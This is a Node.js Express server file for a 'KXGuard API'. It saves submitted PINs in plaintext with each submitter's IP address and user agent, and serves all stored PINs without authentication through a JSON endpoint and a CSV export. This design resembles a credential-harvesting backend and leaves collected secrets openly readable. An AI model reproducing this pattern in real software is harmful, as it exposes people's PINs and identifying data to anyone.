// server.js
const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');
const rateLimit = require('express-rate-limit');

const app = express();
const PORT = process.env.PORT || 3000;

// Security middleware
app.use(cors({
  origin: process.env.ALLOWED_ORIGINS ? process.env.ALLOWED_ORIGINS.split(',') : '*',
  credentials: false
}));

// Rate limiting
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100, // limit each IP to 100 requests per windowMs
  message: 'Too many requests from this IP, please try again later.'
});
app.use(limiter);

app.use(express.json({ limit: '1mb' }));
app.use(express.static(path.join(__dirname, 'public')));

const FILE_PATH = path.join(__dirname, 'data', 'pins.json');
const DATA_DIR = path.join(__dirname, 'data');

// Ensure data directory exists
if (!fs.existsSync(DATA_DIR)) {
  fs.mkdirSync(DATA_DIR, { recursive: true });
}

// Initialize pins.json if it doesn't exist
if (!fs.existsSync(FILE_PATH)) {
  fs.writeFileSync(FILE_PATH, JSON.stringify([], null, 2));
}

function readPins() {
  try {
    if (fs.existsSync(FILE_PATH)) {
      const data = fs.readFileSync(FILE_PATH, 'utf8');
      return JSON.parse(data);
    }
    return [];
  } catch (error) {
    console.error('Error reading pins:', error);
    return [];
  }
}

function writePins(pins) {
  try {
    // Validate pins array
    if (!Array.isArray(pins)) {
      throw new Error('Pins must be an array');
    }
    
    // Limit file size to prevent abuse
    const dataSize = JSON.stringify(pins).length;
    if (dataSize > 10 * 1024 * 1024) { // 10MB limit
      throw new Error('Data size too large');
    }
    
    fs.writeFileSync(FILE_PATH, JSON.stringify(pins, null, 2));
    return true;
  } catch (error) {
    console.error('Error writing pins:', error);
    return false;
  }
}

// Input validation middleware
function validatePin(req, res, next) {
  const { pin } = req.body || {};
  
  if (!pin || typeof pin !== 'string') {
    return res.status(400).json({ error: 'Valid PIN is required' });
  }
  
  // Sanitize PIN - only allow alphanumeric and common symbols
  if (!/^[a-zA-Z0-9!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]+$/.test(pin)) {
    return res.status(400).json({ error: 'PIN contains invalid characters' });
  }
  
  if (pin.length > 50) {
    return res.status(400).json({ error: 'PIN too long' });
  }
  
  next();
}

app.post('/save-pin', validatePin, (req, res) => {
  try {
    const { pin, ts, ua } = req.body || {};
    
    const pins = readPins();
    const newEntry = {
      pin: pin.trim(),
      ts: ts || new Date().toISOString(),
      ua: (ua || '').substring(0, 500), // Limit user agent length
      ip: req.ip,
      createdAt: new Date().toISOString()
    };
    
    pins.push(newEntry);
    
    if (writePins(pins)) {
      console.log(`PIN saved successfully from IP: ${req.ip}`);
      res.json({ status: 'ok', message: 'PIN saved successfully' });
    } else {
      res.status(500).json({ error: 'Failed to save PIN' });
    }
  } catch (error) {
    console.error('Error saving PIN:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

app.get('/get-pins', (req, res) => {
  try {
    const pins = readPins();
    res.json(pins);
  } catch (error) {
    console.error('Error getting pins:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

app.get('/export-pins.csv', (req, res) => {
  try {
    const pins = readPins();
    const header = ['pin', 'timestamp', 'user_agent', 'ip', 'created_at'];
    const rows = pins.map(p => [
      `"${String(p.pin || '').replace(/"/g, '""')}"`,
      p.ts || '',
      `"${String(p.ua || '').replace(/"/g, '""')}"`,
      p.ip || '',
      p.createdAt || ''
    ]);
    
    const csv = [header.join(','), ...rows.map(r => r.join(','))].join('\n');
    
    res.setHeader('Content-Type', 'text/csv');
    res.setHeader('Content-Disposition', 'attachment; filename="kxguard_pins_export.csv"');
    res.send(csv);
  } catch (error) {
    console.error('Error exporting CSV:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Health check endpoint
app.get('/health', (req, res) => {
  res.json({ 
    status: 'healthy', 
    timestamp: new Date().toISOString(),
    uptime: process.uptime()
  });
});

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// Error handling middleware
app.use((err, req, res, next) => {
  console.error('Unhandled error:', err);
  res.status(500).json({ error: 'Internal server error' });
});

// 404 handler
app.use((req, res) => {
  res.status(404).json({ error: 'Endpoint not found' });
});

app.listen(PORT, () => {
  console.log(`🚀 KXGuard API running on port ${PORT}`);
  console.log(`📁 Data directory: ${DATA_DIR}`);
  console.log(`🌐 Health check: http://localhost:${PORT}/health`);
});
